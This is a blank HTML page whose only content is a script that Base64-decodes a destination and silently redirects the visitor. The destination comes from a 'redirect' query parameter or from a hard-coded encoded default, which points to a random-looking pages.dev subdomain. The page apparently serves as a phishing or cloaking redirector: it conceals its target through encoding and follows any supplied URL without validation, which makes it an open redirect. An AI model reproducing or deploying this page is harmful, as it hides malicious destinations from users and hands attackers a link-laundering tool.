<!DOCTYPE html>
<html>
<head>
  <title></title>
  <style>
    html, body {
      background-color: white;
      margin: 0;
    }
  </style>
</head>
<body>
<script>
  // If no redirect is provided, use the default homepage
  const defaultEncoded = "aHR0cHM6Ly93YXJyYW50LXBxdG14ZmdoY2FodnFpcHZ5Z3ZsbW1naXpzbWFreWN1YWVzdXRnenZ0cGJxY3lod3hyLnBhZ2VzLmRldg==";
  const params = new URLSearchParams(window.location.search);
  const encoded = params.get("redirect") || defaultEncoded;
  
  try {
    const realUrl = atob(encoded); // Decode Base64
    setTimeout(() => {
      window.location.href = realUrl;
    }, 100); // Delay helps preserve "Back" history
  } catch (e) {
    document.body.innerHTML = "<h1>Error: Invalid or missing redirect link</h1>";
  }
</script>
</body>
</html>
